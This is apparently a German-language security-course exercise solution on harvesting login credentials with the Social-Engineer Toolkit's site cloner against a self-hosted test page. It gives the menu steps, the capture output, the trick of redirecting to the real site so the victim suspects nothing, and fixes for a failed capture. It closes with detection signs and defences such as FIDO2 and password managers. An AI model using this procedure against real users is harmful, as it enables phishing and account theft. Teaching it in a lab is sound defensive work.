# Lösung – Übung 05: Credential Harvesting mit SET

> **Nur eigene Test-Seite + eigene Test-Accounts im Lab.**

## 1. Eigene Test-Login-Seite

Eine simple HTML-Seite mit `username`/`password`-Formular, die du selbst hostest (dient als „zu klonendes" Zielobjekt – kein reales Portal).

## 2. SET Credential Harvester

```bash
sudo setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
#   IP für POST-back = <KALI>
#   URL zu klonen   = http://<deine-test-seite>
```
SET hostet die geklonte Seite auf `<KALI>` und wartet auf Eingaben.

## 3. Selbst testen

Im Browser `http://<KALI>/` öffnen, **Test-Credentials** eingeben → SET zeigt im Terminal:
```
[*] WE GOT A HIT! ... PARAM: username=testuser  PARAM: password=Test123
```
und leitet zur echten/Original-Seite weiter → der „Nutzer" landet beim echten Login und schöpft keinen Verdacht.

## 4. Warum unbemerkt / trotzdem erkennbar

- **Unbemerkt:** Seite sieht identisch aus; Redirect zur echten Seite nach „Fehlschlag".
- **Erkennbar wäre:** die **URL/Domain** (nicht die echte, oft Lookalike), fehlendes/falsches **TLS-Zertifikat**, der **Passwort-Manager füllt nicht aus** (falsche Domain), kein erwarteter Kontext.

## 5. Abwehr entwertet den Angriff

- **MFA/FIDO2:** Passwort allein nutzlos; FIDO2/Passkeys sind an die echte Origin gebunden → phishing-resistent.
- **Passwort-Manager:** autofill nur auf der **echten** Domain → Fake-Seite bleibt leer (Warnsignal).
- **URL-/Zertifikatsprüfung**, Awareness, DMARC/Link-Rewriting (die Mail gar nicht erst durchlassen).

## Häufige Fehler / Troubleshooting

- **Reales Portal geklont/gegen Dritte:** verboten – eigene Test-Seite, eigene Eingaben.
- **SET fängt nichts:** POST-back-IP = erreichbare Kali-IP; Port 80 frei (`apache2` stoppen).
- **HTTPS fehlt:** Fake-Seiten ohne gültiges Zert → genau das ist ein Erkennungsmerkmal.
- **MFA-Phishing (Real-time-Proxy):** fortgeschritten/konzeptionell – unterstreicht, warum FIDO2 > OTP.
